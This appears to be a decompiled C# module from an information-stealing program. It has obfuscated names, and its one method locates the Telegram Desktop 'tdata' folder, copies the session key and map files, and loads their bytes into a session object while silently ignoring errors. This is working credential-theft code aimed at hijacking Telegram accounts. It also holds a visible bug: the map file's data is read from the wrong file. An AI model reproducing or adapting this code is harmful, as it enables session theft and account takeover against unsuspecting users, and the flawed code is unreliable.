using System;
using System.IO;
using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Models.Common;

namespace NoiseMe.Drags.App.Data.Recovery
{
	// Token: 0x02000195 RID: 405
	public static class Fkf83
	{
		// Token: 0x06000CD6 RID: 3286 RVA: 0x00028F18 File Offset: 0x00027118
		public static TelegramSession Fuul()
		{
			TelegramSession telegramSession = new TelegramSession();
			try
			{
				string path = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming\\Telegram Desktop\\tdata");
				string path2 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C");
				if (!Directory.Exists(path) || !Directory.Exists(path2))
				{
					return telegramSession;
				}
				string[] files = Directory.GetFiles(path, "D877F783D5D3EF8C*");
				if (files.Length != 0)
				{
					byte[] fileData = File.ReadAllBytes(rcvr.CreateTempCopy(files[0]));
					string[] files2 = Directory.GetFiles(path2, "map*");
					if (files2.Length != 0)
					{
						byte[] fileData2 = File.ReadAllBytes(rcvr.CreateTempCopy(files[0]));
						telegramSession.MapFile = new DesktopFile
						{
							FileData = fileData2,
							Filename = new FileInfo(files2[0]).Name
						};
						telegramSession.RootFile = new DesktopFile
						{
							FileData = fileData,
							Filename = new FileInfo(files[0]).Name
						};
					}
				}
			}
			catch (Exception)
			{
			}
			return telegramSession;
		}
	}
}
